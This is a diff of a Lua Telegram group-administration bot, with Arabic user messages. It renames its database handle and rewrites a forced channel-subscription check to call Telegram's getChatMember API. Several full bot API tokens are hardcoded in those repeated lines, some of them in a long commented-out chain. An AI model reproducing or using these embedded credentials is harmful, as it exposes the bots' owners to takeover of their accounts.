+local res = https.request('https://api.telegram.org/bot811517309:AAHXqID4uTs4NOfcRH3WHIBd6pf353sxNmg/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @MohaMeDFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@MohaMeDfreer.MohaMeD ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @MohaMeD ⚜️\n', 1, 'html')   
 return false end
-if not is_creator(msg) and database:get('MohaMeD:'..bot_id.."MohaMeD:lock:set"..msg.chat_id_) then 
+if not is_creator(msg) and datahmade:get('MohaMeD:'..bot_id.."MohaMeD:lock:set"..msg.chat_id_) then 
 send(msg.chat_id_, msg.id_, 1, '✖┇لا تستطيع الرفع تم تعطيل الرفع من قبل المنشئين \n', 1, 'md')
 return false end
 local apmd = {string.match(text, "^(رفع ادمن) (%d+)$")}
-local url , res = http.request('http://MohaMeD.ml/joinch/?id='..msg.sender_user_id_..'')
-data = JSON.decode(url)
-if data.Ch_Member.MohaMeD ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @M1_m2s ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot811517309:AAHXqID4uTs4NOfcRH3WHIBd6pf353sxNmg/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @MohaMeDFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@MohaMeDfreer.MohaMeD ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @MohaMeD ⚜️\n', 1, 'html')   
 return false end
-database:sadd('MohaMeD:'..bot_id..'mods:'..msg.chat_id_, apmd[2])
+datahmade:sadd('MohaMeD:'..bot_id..'mods:'..msg.chat_id_, apmd[2])
 tsX000(apmd[2],msg,"🔖┇تم رفعة ادمن   في البوت")
 return false
 end
 if text == ("تنزيل ادمن") and msg.reply_to_message_id_ then
 function demote_by_reply(extra, result, success)
 local hash =  'MohaMeD:'..bot_id..'mods:'..msg.chat_id_
-if not database:sismember(hash, result.sender_user_id_) then
+if not datahmade:sismember(hash, result.sender_user_id_) then
 tsX000("prore",msg,"🔰┇بالفعل تم تنزيله من ادمنيه البوت")
 else
-database:srem(hash, result.sender_user_id_)
+datahmade:srem(hash, result.sender_user_id_)
 tsX000("prore",msg,"🔰┇تم تنزيله من ادمنيه البوت")
 end
 end
@@ -4607,7 +4474,7 @@ local hash =  'MohaMeD:'..bot_id..'mods:'..msg.chat_id_
 local apmd = {string.match(text, "^(تنزيل ادمن) @(.*)$")}
 function demote_by_username(extra, result, success)
 if result.id_ then
-database:srem(hash, result.id_)
+datahmade:srem(hash, result.id_)
 texts = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(apmd[2] or 'MohaMeDTEAM')..')\n🔰┇تم تنزيله من ادمنيه البوت'
 else
 texts = '✖┇خطاء'
@@ -4620,36 +4487,36 @@ end
 if text and text:match("^تنزيل ادمن (%d+)$") then
 local hash =  'MohaMeD:'..bot_id..'mods:'..msg.chat_id_
 local apmd = {string.match(text, "^(تنزيل ادمن) (%d+)$")}
-database:srem(hash, apmd[2])
+datahmade:srem(hash, apmd[2])
 tsX000(apmd[2],msg,"🔰┇تم تنزيله من ادمنيه البوت")
 return false
 end
 if text == 'مسح الادمنيه' then
-database:del('MohaMeD:'..bot_id..'mods:'..msg.chat_id_)
+datahmade:del('MohaMeD:'..bot_id..'mods:'..msg.chat_id_)
 send(msg.chat_id_, msg.id_, 1, '🗑┇ تم مسح  قائمة الادمنية  ', 1, 'md')
 end
 if text and text == "تعين الايدي" then
 send(msg.chat_id_, msg.id_, 1,  '☑┇ ارسل الان النص\n☑┇ يمكنك اضافه :\n- `#username` > اسم المستخدم\n- `#msgs` > عدد رسائل المستخدم\n- `#photos` > عدد صور المستخدم\n- `#id` > ايدي المستخدم\n- `#auto` > تفاعل المستخدم\n- `#stast` > موقع المستخدم \n- `#edit` > عدد السحكات\n- `#game` > المجوهرات', 1, 'md')
-database:set("tsahke:set:id:"..bot_id..msg.chat_id_..msg.sender_user_id_,'MohaMeD')
+datahmade:set("tsahke:set:id:"..bot_id..msg.chat_id_..msg.sender_user_id_,'MohaMeD')
 return "MohaMeD"
 end
 
 if text and text == "مسح الايدي" then
 send(msg.chat_id_, msg.id_, 1,  '✖┇ تم المسح بنجاح', 1, 'md')
-database:del("MohaMeD:gr:id:text:"..bot_id..msg.chat_id_)
+datahmade:del("MohaMeD:gr:id:text:"..bot_id..msg.chat_id_)
 end
 
 if text == ("الادمنيه") then
-local url , res = http.request('http://MohaMeD.ml/joinch/?id='..msg.sender_user_id_..'')
-data = JSON.decode(url)
-if data.Ch_Member.MohaMeD ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @M1_m2s ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot811517309:AAHXqID4uTs4NOfcRH3WHIBd6pf353sxNmg/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @MohaMeDFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@MohaMeDfreer.MohaMeD ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @MohaMeD ⚜️\n', 1, 'html')   
 return false end
 local hash =   'MohaMeD:'..bot_id..'mods:'..msg.chat_id_
-local list = database:smembers(hash)
+local list = datahmade:smembers(hash)
 text = "👥┇قائمة الادمنيه ،\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ \n"
 for k,v in pairs(list) do
-local user_info = database:hgetall('MohaMeD:'..bot_id..'user:'..v)
+local user_info = datahmade:hgetall('MohaMeD:'..bot_id..'user:'..v)
 if user_info and user_info.username then
 local username = user_info.username
 text = text.."<b>|"..k.."|</b>~⪼(@"..username..")\n"
@@ -4672,7 +4539,7 @@ local floodmax = {string.match(text, "^(وضع تكرار) (%d+)$")}
 if tonumber(floodmax[2]) < 2 then
 send(msg.chat_id_, msg.id_, 1, '🔘┇ضع التكرار من *{2}* الى  *{99999}*', 1, 'md')
 else
-database:set('MohaMeD:'..bot_id..'flood:max:'..msg.chat_id_,floodmax[2])
+datahmade:set('MohaMeD:'..bot_id..'flood:max:'..msg.chat_id_,floodmax[2])
 send(msg.chat_id_, msg.id_, 1, '☑┇تم  وضع التكرار بالطرد للعدد ~⪼  *{'..floodmax[2]..'}*', 1, 'md')
 end
 end
@@ -4682,7 +4549,7 @@ local floodt = {string.match(text, "^(وضع زمن التكرار) (%d+)$")}
 if tonumber(floodt[2]) < 1 then
 send(msg.chat_id_, msg.id_, 1, '🔘┇ضع العدد من *{1}* الى  *{99999}*', 1, 'md')
 else
-database:set('MohaMeD:'..bot_id..'flood:time:'..msg.chat_id_,floodt[2])
+datahmade:set('MohaMeD:'..bot_id..'flood:time:'..msg.chat_id_,floodt[2])
 send(msg.chat_id_, msg.id_, 1, '☑┇تم  وضع الزمن التكرار للعدد ~⪼  *{'..floodt[2]..'}*', 1, 'md')
 end
 end
@@ -4693,7 +4560,7 @@ local text = "👨‍👧‍👦 ┇ قائمه الاعضاء   ،\nꔹ┉♦�
 i = 0
 for k, v in pairs(t2.members_) do
 i = i + 1
-local user_info = database:hgetall('MohaMeD:'..bot_id..'user:'..v.user_id_)
+local user_info = datahmade:hgetall('MohaMeD:'..bot_id..'user:'..v.user_id_)
 if user_info and user_info.username then
 local username = user_info.username
 text = text.."<b>|"..i.."|</b>~⪼(@"..username..")\n"
@@ -4712,7 +4579,7 @@ text = '📊┇ادمنيه الكروب\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ \n
 local n = 0
 for k,v in pairs(list) do
 n = (n + 1)
-local user_info = database:hgetall('MohaMeD:'..bot_id..'user:'..v.user_id_)
+local user_info = datahmade:hgetall('MohaMeD:'..bot_id..'user:'..v.user_id_)
 if user_info and user_info.username then
 local username = user_info.username
 text = text.."<b>|"..n.."|</b>~⪼(@"..username..")\n"
@@ -4729,10 +4596,10 @@ end
 bot.channel_get_admins(msg.chat_id_,cb)
 end
 if text == ("رفع الادمنيه") then
-local url , res = http.request('http://MohaMeD.ml/joinch/?id='..msg.sender_user_id_..'')
-data = JSON.decode(url)
-if data.Ch_Member.MohaMeD ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @M1_m2s ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot811517309:AAHXqID4uTs4NOfcRH3WHIBd6pf353sxNmg/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @MohaMeDFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@MohaMeDfreer.MohaMeD ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @MohaMeD ⚜️\n', 1, 'html')   
 return false end
 local function cb(extra,result,success)
 local list = result.members_
@@ -4741,47 +4608,46 @@ local n = 0
 for k,v in pairs(list) do
 n = (n + 1)
 local hash =  'MohaMeD:'..bot_id..'mods:'..msg.chat_id_
-database:sadd(hash, v.user_id_)
+datahmade:sadd(hash, v.user_id_)
 end
 send(msg.chat_id_, msg.id_, 1, moody, 1, 'html')
 end
 bot.channel_get_admins(msg.chat_id_,cb)
 end
 if (text and text == 'تفعيل اطردني') then
-if not database:get('MohaMeD:'..bot_id..'kickme:mute'..msg.chat_id_) then
+if not datahmade:get('MohaMeD:'..bot_id..'kickme:mute'..msg.chat_id_) then
 send(msg.chat_id_, msg.id_, 1, '✔️┇ امر اطردني بالفعل تم تفعيلة ', 1, 'md')
 else
 send(msg.chat_id_, msg.id_, 1, '✔️┇ امر اطردني تم تفعيلة ', 1, 'md')
-database:del('MohaMeD:'..bot_id..'kickme:mute'..msg.chat_id_)
+datahmade:del('MohaMeD:'..bot_id..'kickme:mute'..msg.chat_id_)
 end
 end
 if (text and text == 'تعطيل اطردني') then
-if database:get('MohaMeD:'..bot_id..'kickme:mute'..msg.chat_id_) then
+if datahmade:get('MohaMeD:'..bot_id..'kickme:mute'..msg.chat_id_) then
 send(msg.chat_id_, msg.id_, 1, '🔌┇ تم تعطيل امر اطردني بالفعل ', 1, 'md')
 else
 send(msg.chat_id_, msg.id_, 1, '🔌┇ تم تعطيل امر اطردني ', 1, 'md')
-database:set('MohaMeD:'..bot_id..'kickme:mute'..msg.chat_id_,true)
+datahmade:set('MohaMeD:'..bot_id..'kickme:mute'..msg.chat_id_,true)
 end
 end
 if text and text:match("^رفع (.*)$")  and msg.reply_to_message_id_ then
 a = {string.match(text, "^رفع (.*)$")}
-ts_text = database:get("MohaMeD:all_sl:"..a[1]..bot_id..msg.chat_id_)
+ts_text = datahmade:get("MohaMeD:all_if:"..a[1]..bot_id..msg.chat_id_)
 if ts_text then 
 function promote_by_reply(extra, result, success)
 if ts_text == "ادمن" then 
-database:sadd('MohaMeD:'..bot_id..'mods:'..msg.chat_id_, result.sender_user_id_)
+datahmade:sadd('MohaMeD:'..bot_id..'mods:'..msg.chat_id_, result.sender_user_id_)
 elseif ts_text == "عضو مميز" then 
-database:sadd('MohaMeD:'..bot_id..'vipgp:'..msg.chat_id_, result.sender_user_id_)
+datahmade:sadd('MohaMeD:'..bot_id..'vipgp:'..msg.chat_id_, result.sender_user_id_)
 elseif ts_text == "مدير" then 
-database:sadd('MohaMeD:'..bot_id..'owners:'..msg.chat_id_, result.sender_user_id_)
+datahmade:sadd('MohaMeD:'..bot_id..'owners:'..msg.chat_id_, result.sender_user_id_)
 end
-database:set("MohaMeD:name_user:"..bot_id..msg.chat_id_..result.sender_user_id_,a[1])
-database:sadd('MohaMeD:'..bot_id..'MohaMeD:users:sl'..msg.chat_id_,result.sender_user_id_)
-function keko33332(extra,result2,success)
+datahmade:set("MohaMeD:name_user:"..bot_id..msg.chat_id_..result.sender_user_id_,a[1])
+function ahmad33332(extra,result2,success)
 info = '👤┇العضو ~⪼ ['..result2.first_name_..'](t.me/'..(result2.username_ or 'MohaMeDTEAM')..')\n☑┇تم رفعه '..a[1]
 send(msg.chat_id_, msg.id_, 1,info, 1, 'md')
 end
-getUser(result.sender_user_id_, keko33332)  
+getUser(result.sender_user_id_, ahmad33332)  
 end 
 getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
 end 
@@ -4789,7 +4655,7 @@ end
 
 if text and text:match("^رفع (.*) @(.*)$") then
 local apmd = {string.match(text, "^رفع (.*) @(.*)$")}
-ts_text = database:get("MohaMeD:all_sl:"..apmd[1]..bot_id..msg.chat_id_)
+ts_text = datahmade:get("MohaMeD:all_if:"..apmd[1]..bot_id..msg.chat_id_)
 if ts_text then 
 function promote_by_username(extra, result, success)
 if result.id_ then
@@ -4798,14 +4664,13 @@ SendText(msg.chat_id_,msg.id_,"*📮┇ هاذا معرف قناة \n*")
 return false 
 end      
 if ts_text == "ادمن" then 
-database:sadd('MohaMeD:'..bot_id..'mods:'..msg.chat_id_, result.id_)
+datahmade:sadd('MohaMeD:'..bot_id..'mods:'..msg.chat_id_, result.id_)
 elseif ts_text == "عضو مميز" then 
-database:sadd('MohaMeD:'..bot_id..'vipgp:'..msg.chat_id_, result.id_)
+datahmade:sadd('MohaMeD:'..bot_id..'vipgp:'..msg.chat_id_, result.id_)
 elseif ts_text == "مدير" then 
-database:sadd('MohaMeD:'..bot_id..'owners:'..msg.chat_id_, result.id_)
+datahmade:sadd('MohaMeD:'..bot_id..'owners:'..msg.chat_id_, result.id_)
 end
-database:set("MohaMeD:name_user:"..bot_id..msg.chat_id_..result.id_,apmd[1])
-database:sadd('MohaMeD:'..bot_id..'MohaMeD:users:sl'..msg.chat_id_,result.id_)
+datahmade:set("MohaMeD:name_user:"..bot_id..msg.chat_id_..result.id_,apmd[1])
 texts = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(apmd[2] or 'MohaMeDTEAM')..')\n☑┇تم رفعه '..apmd[1]
 else
 texts = '✖┇خطاء'
@@ -4817,34 +4682,32 @@ end
 end
 if text and text:match("^رفع (.*) (%d+)$") then
 local apmd = {string.match(text, "^رفع (.*) (%d+)$")}
-ts_text = database:get("MohaMeD:all_sl:"..apmd[1]..bot_id..msg.chat_id_)
+ts_text = datahmade:get("MohaMeD:all_if:"..apmd[1]..bot_id..msg.chat_id_)
 if ts_text then 
 if ts_text == "ادمن" then 
-database:sadd('MohaMeD:'..bot_id..'mods:'..msg.chat_id_, apmd[2])
+datahmade:sadd('MohaMeD:'..bot_id..'mods:'..msg.chat_id_, apmd[2])
 elseif ts_text == "عضو مميز" then 
-database:sadd('MohaMeD:'..bot_id..'vipgp:'..msg.chat_id_, apmd[2])
+datahmade:sadd('MohaMeD:'..bot_id..'vipgp:'..msg.chat_id_, apmd[2])
 elseif ts_text == "مدير" then 
-database:sadd('MohaMeD:'..bot_id..'owners:'..msg.chat_id_, apmd[2])
+datahmade:sadd('MohaMeD:'..bot_id..'owners:'..msg.chat_id_, apmd[2])
 end
-database:set("MohaMeD:name_user:"..bot_id..msg.chat_id_..apmd[2],apmd[1])
-database:sadd('MohaMeD:'..bot_id..'MohaMeD:users:sl'..msg.chat_id_,apmd[2])
+datahmade:set("MohaMeD:name_user:"..bot_id..msg.chat_id_..apmd[2],apmd[1])
 tsX000(apmd[2],msg,"☑┇تم رفعه "..apmd[1])
 end
 end
 if text and text:match("^تنزيل (.*)$") and msg.reply_to_message_id_ then
 a = {string.match(text, "^تنزيل (.*)$")}
-ts_text = database:get("MohaMeD:all_sl:"..a[1]..bot_id..msg.chat_id_)
+ts_text = datahmade:get("MohaMeD:all_if:"..a[1]..bot_id..msg.chat_id_)
 if ts_text then 
 function demote_by_reply(extra, result, success)
 if ts_text == "ادمن" then 
-database:srem('MohaMeD:'..bot_id..'mods:'..msg.chat_id_, result.sender_user_id_)
+datahmade:srem('MohaMeD:'..bot_id..'mods:'..msg.chat_id_, result.sender_user_id_)
 elseif ts_text == "عضو مميز" then 
-database:srem('MohaMeD:'..bot_id..'vipgp:'..msg.chat_id_, result.sender_user_id_)
+datahmade:srem('MohaMeD:'..bot_id..'vipgp:'..msg.chat_id_, result.sender_user_id_)
 elseif ts_text == "مدير" then 
-database:srem('MohaMeD:'..bot_id..'owners:'..msg.chat_id_, result.sender_user_id_)
+datahmade:srem('MohaMeD:'..bot_id..'owners:'..msg.chat_id_, result.sender_user_id_)
 end
-database:del("MohaMeD:name_user:"..bot_id..msg.chat_id_..result.sender_user_id_)
-database:srem('MohaMeD:'..bot_id..'MohaMeD:users:sl'..msg.chat_id_,result.sender_user_id_)
+datahmade:del("MohaMeD:name_user:"..bot_id..msg.chat_id_..result.sender_user_id_)
 tsX000("prore",msg,"🔰┇تم تنزيله من "..a[1])
 end
 getMessage(msg.chat_id_, msg.reply_to_message_id_,demote_by_reply)
@@ -4852,7 +4715,7 @@ end
 end
 if text and text:match("^تنزيل (.*) @(.*)$") then
 local apmd = {string.match(text, "^تنزيل (.*) @(.*)$")}
-ts_text = database:get("MohaMeD:all_sl:"..apmd[1]..bot_id..msg.chat_id_)
+ts_text = datahmade:get("MohaMeD:all_if:"..apmd[1]..bot_id..msg.chat_id_)
 if ts_text then 
 function demote_by_username(extra, result, success)
 if result.id_ then
@@ -4861,15 +4724,14 @@ SendText(msg.chat_id_,msg.id_,"*📮┇ هاذا معرف قناة \n*")
 return false 
 end      
 if ts_text == "ادمن" then 
-database:srem('MohaMeD:'..bot_id..'mods:'..msg.chat_id_, result.id_)
+datahmade:srem('MohaMeD:'..bot_id..'mods:'..msg.chat_id_, result.id_)
 elseif ts_text == "عضو مميز" then 
-database:srem('MohaMeD:'..bot_id..'vipgp:'..msg.chat_id_, result.id_)
+datahmade:srem('MohaMeD:'..bot_id..'vipgp:'..msg.chat_id_, result.id_)
 elseif ts_text == "مدير" then 
-database:srem('MohaMeD:'..bot_id..'owners:'..msg.chat_id_, result.id_)
+datahmade:srem('MohaMeD:'..bot_id..'owners:'..msg.chat_id_, result.id_)
 end
 texts = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(apmd[2] or 'MohaMeDTEAM')..')\n🔰┇تم تنزيله من '..apmd[1]
-database:srem('MohaMeD:'..bot_id..'MohaMeD:users:sl'..msg.chat_id_,result.id_)
-database:del("MohaMeD:name_user:"..bot_id..msg.chat_id_..result.id_)
+datahmade:del("MohaMeD:name_user:"..bot_id..msg.chat_id_..result.id_)
 else
 texts = '✖┇خطاء'
 end
@@ -4880,133 +4742,132 @@ end
 end
 if text and text:match("^تنزيل (.*) (%d+)$") then
 local apmd = {string.match(text, "^تنزيل (.*) (%d+)$")}
-ts_text = database:get("MohaMeD:all_sl:"..apmd[1]..bot_id..msg.chat_id_)
+ts_text = datahmade:get("MohaMeD:all_if:"..apmd[1]..bot_id..msg.chat_id_)
 if ts_text then 
 if ts_text == "ادمن" then 
-database:srem('MohaMeD:'..bot_id..'mods:'..msg.chat_id_, apmd[2])
+datahmade:srem('MohaMeD:'..bot_id..'mods:'..msg.chat_id_, apmd[2])
 elseif ts_text == "عضو مميز" then 
-database:srem('MohaMeD:'..bot_id..'vipgp:'..msg.chat_id_, apmd[2])
+datahmade:srem('MohaMeD:'..bot_id..'vipgp:'..msg.chat_id_, apmd[2])
 elseif ts_text == "مدير" then 
-database:srem('MohaMeD:'..bot_id..'owners:'..msg.chat_id_, apmd[2])
+datahmade:srem('MohaMeD:'..bot_id..'owners:'..msg.chat_id_, apmd[2])
 end
 tsX000(apmd[2],msg,"🔰┇تم تنزيله من "..apmd[1])
-database:del("MohaMeD:name_user:"..bot_id..msg.chat_id_..apmd[2])
-database:srem('MohaMeD:'..bot_id..'MohaMeD:users:sl'..msg.chat_id_,apmd[2])
+datahmade:del("MohaMeD:name_user:"..bot_id..msg.chat_id_..apmd[2])
 end
 end
 
 if (text and text == 'تفعيل الايدي بالصوره') then
-if not database:get('MohaMeD:'..bot_id..'id:photo'..msg.chat_id_) then
+if not datahmade:get('MohaMeD:'..bot_id..'id:photo'..msg.chat_id_) then
 send(msg.chat_id_, msg.id_, 1, '📸 ┇ بلفعل  الايدي بالصوره مفعل ', 1, 'md')
 else
 send(msg.chat_id_, msg.id_, 1, '📸 ┇ تم تفعيل الايدي بالصوره ', 1, 'md')
-database:del('MohaMeD:'..bot_id..'id:photo'..msg.chat_id_)
+datahmade:del('MohaMeD:'..bot_id..'id:photo'..msg.chat_id_)
 end
 end
 if (text and text == 'تعطيل الايدي بالصوره') then
-if database:get('MohaMeD:'..bot_id..'id:photo'..msg.chat_id_) then
+if datahmade:get('MohaMeD:'..bot_id..'id:photo'..msg.chat_id_) then
 send(msg.chat_id_, msg.id_, 1, '📸 ┇ بلفعل الايدي بالصوره معطل', 1, 'md')
 else
 send(msg.chat_id_, msg.id_, 1, '📸 ┇ تم تعطيل  الايدي بالصوره ', 1, 'md')
-database:set('MohaMeD:'..bot_id..'id:photo'..msg.chat_id_,true)
+datahmade:set('MohaMeD:'..bot_id..'id:photo'..msg.chat_id_,true)
 end
 end
 
 if (text and text == 'تفعيل ردود المطور') then
-if not database:get('MohaMeD:'..bot_id..'repsudo:mute'..msg.chat_id_) then
+if not datahmade:get('MohaMeD:'..bot_id..'repsudo:mute'..msg.chat_id_) then
 send(msg.chat_id_, msg.id_, 1, '✔️┇ردود المطور بالفعل تم تفعيلها', 1, 'md')
 else
 send(msg.chat_id_, msg.id_, 1, '✔️┇تم تفعيل ردود المطور', 1, 'md')
-database:del('MohaMeD:'..bot_id..'repsudo:mute'..msg.chat_id_)
+datahmade:del('MohaMeD:'..bot_id..'repsudo:mute'..msg.chat_id_)
 end
 end
 if  (text and text == 'تعطيل ردود المطور') then
-if database:get('MohaMeD:'..bot_id..'repsudo:mute'..msg.chat_id_) then
+if datahmade:get('MohaMeD:'..bot_id..'repsudo:mute'..msg.chat_id_) then
 send(msg.chat_id_, msg.id_, 1, '🔌┇ردود المطور بالفعل تم تعطيلها', 1, 'md')
 else
 send(msg.chat_id_, msg.id_, 1, '🔌┇تم تعطيل ردود المطور', 1, 'md')
-database:set('MohaMeD:'..bot_id..'repsudo:mute'..msg.chat_id_,true)
+datahmade:set('MohaMeD:'..bot_id..'repsudo:mute'..msg.chat_id_,true)
 end
 end
 if (text and text == 'تفعيل ردود المدير') then
-if not database:get('MohaMeD:'..bot_id..'repowner:mute'..msg.chat_id_) then
+if not datahmade:get('MohaMeD:'..bot_id..'repowner:mute'..msg.chat_id_) then
 send(msg.chat_id_, msg.id_, 1, '✔️┇ردود المدير بالفعل تم تفعيلها', 1, 'md')
 else
 send(msg.chat_id_, msg.id_, 1, '✔️┇تم تفعيل ردود المدير', 1, 'md')
-database:del('MohaMeD:'..bot_id..'repowner:mute'..msg.chat_id_)
+datahmade:del('MohaMeD:'..bot_id..'repowner:mute'..msg.chat_id_)
 end
 end
 if (text and text == 'تعطيل ردود المدير') then
-if database:get('MohaMeD:'..bot_id..'repowner:mute'..msg.chat_id_) then
+if datahmade:get('MohaMeD:'..bot_id..'repowner:mute'..msg.chat_id_) then
 send(msg.chat_id_, msg.id_, 1, '🔌┇ردود المدير بالفعل تم تعطيلها', 1, 'md')
 else
 send(msg.chat_id_, msg.id_, 1, '🔌┇تم تعطيل ردود المدير', 1, 'md')
-database:set('MohaMeD:'..bot_id..'repowner:mute'..msg.chat_id_,true)
+datahmade:set('MohaMeD:'..bot_id..'repowner:mute'..msg.chat_id_,true)
 end
 end
 
 if (text and text == 'تفعيل الايدي') then
-if not database:get('MohaMeD:'..bot_id..'id:mute'..msg.chat_id_) then
+if not datahmade:get('MohaMeD:'..bot_id..'id:mute'..msg.chat_id_) then
 send(msg.chat_id_, msg.id_, 1, '✔️┇ الايدي بالفعل تم تفعيله ', 1, 'md')
 else
 send(msg.chat_id_, msg.id_, 1, '✔️┇ الايدي  تم تفعيله ', 1, 'md')
-database:del('MohaMeD:'..bot_id..'id:mute'..msg.chat_id_)
+datahmade:del('MohaMeD:'..bot_id..'id:mute'..msg.chat_id_)
 end
 end
 if (text and text == 'تعطيل الايدي') then
-if database:get('MohaMeD:'..bot_id..'id:mute'..msg.chat_id_) then
+if datahmade:get('MohaMeD:'..bot_id..'id:mute'..msg.chat_id_) then
 send(msg.chat_id_, msg.id_, 1, '🔌┇ تم تعطيل الايدي بالفعل  ', 1, 'md')
 else
 send(msg.chat_id_, msg.id_, 1, '🔌┇ تم تعطيل الايدي  ', 1, 'md')
-database:set('MohaMeD:'..bot_id..'id:mute'..msg.chat_id_,true)
+datahmade:set('MohaMeD:'..bot_id..'id:mute'..msg.chat_id_,true)
 end
 end
 if (text and text == "تعطيل الرابط") then 
 send(msg.chat_id_, msg.id_, 1, '🔌┇تم تعطيل امر الروابط', 1, 'md')
-database:set("MohaMeD:mute:link:gr:"..bot_id..msg.chat_id_,"ok")
+datahmade:set("MohaMeD:mute:link:gr:"..bot_id..msg.chat_id_,"ok")
 end
 if (text and text == "تفعيل الرابط") then 
 send(msg.chat_id_, msg.id_, 1, '✔️┇تم تفعيل امر الروابط', 1, 'md')
-database:del("MohaMeD:mute:link:gr:"..bot_id..msg.chat_id_)
+datahmade:del("MohaMeD:mute:link:gr:"..bot_id..msg.chat_id_)
 end
 if (text and text == "تعطيل اوامر التحشيش") then 
 send(msg.chat_id_, msg.id_, 1, '🔌┇تم تعطيل اوامر التحشيش', 1, 'md')
-database:set("Fun_Bots:"..bot_id..msg.chat_id_,"true")
+datahmade:set("Fun_Bots:"..bot_id..msg.chat_id_,"true")
 end
 if (text and text == "تفعيل اوامر التحشيش") then 
 send(msg.chat_id_, msg.id_, 1, '✔️┇تم تفعيل اوامر التحشيش', 1, 'md')
-database:del("Fun_Bots:"..bot_id..msg.chat_id_)
